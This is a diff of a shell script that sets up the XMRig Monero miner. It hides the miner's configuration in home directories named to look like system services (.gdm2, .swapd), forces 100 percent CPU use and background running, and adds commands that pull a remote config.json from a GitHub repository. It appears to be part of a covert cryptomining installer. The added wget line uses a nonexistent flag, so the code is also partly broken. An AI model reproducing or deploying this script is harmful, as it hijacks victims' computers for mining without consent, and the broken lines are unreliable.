@@ -238,24 +238,11 @@ sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.js
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/.gdm2/xmrig.log'",#' $HOME/.gdm2/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.json
 
+wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json
+
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
-
-rm $HOME/.gdm2/config.json
-
-cat $HOME/.gdm2/config.json <<EOL
-{
-    "autosave": true,
-    "cpu": true,
-    "opencl": true,
-    "cuda": true,
-    "pools": [
-        {
-            "url": "194.164.63.118:3333"
-        }
-    ]
-}
-EOL
 
 
 # preparing script
